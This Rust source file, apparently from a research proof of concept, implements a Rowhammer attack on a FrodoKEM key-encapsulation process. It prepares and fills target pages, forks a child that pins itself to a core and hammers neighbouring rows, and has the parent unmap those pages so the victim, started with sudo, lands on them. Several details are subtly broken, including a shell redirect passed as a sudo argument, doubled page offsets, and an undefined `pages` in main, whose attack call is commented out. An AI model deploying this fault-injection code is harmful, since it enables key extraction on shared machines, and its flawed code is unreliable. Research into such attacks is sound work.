use core::ffi::c_void;

use std::{
    io::{self, Write},
    process::{self, Command},
    thread,
    time::Duration,
};

use nix::{
    sched::{sched_setaffinity, CpuSet},
    sys::mman::munmap,
    unistd::{fork, ForkResult, Pid},
};

use crate::profiler::{
    pagefinder::PageCandidate,
    utils::{fill_memory, get_block_by_order, rowhammer, setup_mapping, Consts},
};

fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
    println!("Setting up attack pages:");
    for (i, page) in pages.iter().enumerate() {
        println!("Page {}: {:#?}", i, page.target_page);
        println!("Above pages: {:?}", page.above_pages);
        println!("Below pages: {:?}", page.below_pages);
    }

    let mut block_mapping = get_block_by_order(12);

    println!("Initializing pages");

    for page in &pages {
        unsafe {
            fill_memory(
                page.target_page.virt_addr,
                page.above_pages.0.virt_addr,
                page.below_pages.0.virt_addr,
            );
            fill_memory(
                page.target_page.virt_addr,
                page.above_pages.1.virt_addr,
                page.below_pages.1.virt_addr,
            );
        }
    }

    println!("Starting attack");
    io::stdout().flush().unwrap();

    match unsafe { fork() } {
        Ok(ForkResult::Parent { child }) => {
            println!("Started attack in child process {}", child);

            thread::sleep(Duration::from_secs(10));

            // Set Cpu affinity to core 2
            let mut cpu_set = CpuSet::new();
            cpu_set.set(2).unwrap();
            sched_setaffinity(Pid::from_raw(0), &cpu_set).unwrap();

            // Unmap all allocated pages to make room for the FrodoKEM process
            // Check if works with block_mapping len or if we need STACK_SIZE TODO!
            let ptr = block_mapping.as_mut_ptr();
            for offset in (0..block_mapping.len() / 2).step_by(Consts::PAGE_SIZE) {
                unsafe {
                    munmap(
                        ptr.add(Consts::PAGE_SIZE * offset) as *mut c_void,
                        Consts::PAGE_SIZE,
                    );
                }
            }

            for (i, page) in pages.iter().enumerate() {
                unsafe {
                    munmap(page.target_page.virt_addr as *mut c_void, Consts::PAGE_SIZE);
                }
            }

            for offset in (block_mapping.len() / 2..block_mapping.len()).step_by(Consts::PAGE_SIZE)
            {
                unsafe {
                    munmap(
                        ptr.add(Consts::PAGE_SIZE * offset) as *mut c_void,
                        Consts::PAGE_SIZE,
                    );
                }
            }

            let ok = Command::new("sudo")
                .arg("../../test_KEM > vic.txt")
                .status()
                .expect("failed to execute command");

            println!("FrodoKEM process exited with: {}", ok);
            thread::sleep(Duration::from_secs(5));

            println!("Killing child process {}", child);
            let ok = Command::new("sudo")
                .arg("kill")
                .arg("-9")
                .arg(format!("{}", child))
                .status()
                .expect("failed to kill child, sorry master :(");
        }

        Ok(ForkResult::Child) => {
            println!("Running attack");

            // Setting Cpu affinity to core 1
            let mut cpu_set = CpuSet::new();
            cpu_set.set(1).unwrap();
            sched_setaffinity(Pid::from_raw(0), &cpu_set).unwrap();

            // Set values to allocated memory before attacking
            // Check if works with block_mapping len or if we need STACK_SIZE TODO!
            let ptr = block_mapping.as_mut_ptr();
            for offset in (0..block_mapping.len() / 2).step_by(Consts::PAGE_SIZE) {
                unsafe {
                    *ptr.add(offset) = (pages.len() + offset) as u8 & 0xFF;
                }
            }

            for (i, page) in pages.iter().enumerate() {
                unsafe {
                    std::ptr::write_bytes(
                        page.target_page.virt_addr,
                        i as u8 & 0xFF,
                        Consts::PAGE_SIZE,
                    )
                }
            }

            for offset in (block_mapping.len() / 2..block_mapping.len()).step_by(Consts::PAGE_SIZE)
            {
                unsafe {
                    *ptr.add(offset) = (pages.len() + offset) as u8 & 0xFF;
                }
            }

            while hammer {
                for page in &pages {
                    rowhammer(page.above_pages.0.virt_addr, page.below_pages.0.virt_addr);
                }
            }
        }
        Err(_) => {
            println!("Failed to fork process");
            process::exit(1);
        }
    }

    println!("Done with attack");
}

pub(crate) fn main(fraction_of_phys_memory: f64, testing: bool) {
    let mut hammer = true;

    if testing {
        hammer = false;
    }

    let pagemap = setup_mapping(fraction_of_phys_memory);

    //rowhammer_attack(hammer, pages);

    println!("Done with attack");
}
